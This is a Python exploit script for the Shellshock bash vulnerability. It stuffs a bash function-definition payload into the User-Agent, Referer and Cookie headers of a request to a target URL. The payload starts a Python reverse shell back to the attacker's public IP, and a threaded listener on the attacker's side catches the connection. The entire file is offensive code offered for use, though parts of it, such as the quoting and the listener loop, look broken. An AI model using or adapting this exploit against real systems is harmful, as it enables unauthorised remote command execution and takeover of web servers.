#! /usr/bin/env python

import requests
import ipgetter
import sys
from colorama import Fore, Style
import socket
import threading

class Exploit:
    
    def exploit(url, port):
        
        IP = ipgetter.myip()
        Port = port
        shock = ('() { :;}: echo; python -c "exec(\"import socket, subprocess;s = socket.socket() ;s.connect((' + IP + ', ' + Port + '))\n while 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"')
        headers = {'User-Agent':shock, 'Referer':shock, 'Cookie':shock}
        
        try:
            requests.get(url, headers=headers, timeout=10)
            print(Fore.YELLOW + '[+] Exploit successfully sent. Waiting for a connection!' + Style.RESET_ALL)
        except requests.ConnectionError as err:
            print(Fore.RED + '[!] Error: The connection failed!' + Style.RESET_ALL)
            sys.exit()
            
    def listener(port):
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.bind(('0.0.0.0', port))
        s.listen(5)

        print(Fore.YELLOW + '[+] Listening on port %s' % (port) + Style.RESET_ALL)

        def connection_handler(client_socket):
            data = client_socket.recv(1024)
            while data:
                print(data)
            else:
                s.close()
        
        while True:
            conn,addr = s.accept()
            print(Fore.GREEN + '[+] Connection from %s ' % (addr[0]) + Style.RESET_ALL)
            
            handled_connection = threading.Thread(target=connection_handler,args=(conn,))
            handled_connection.start()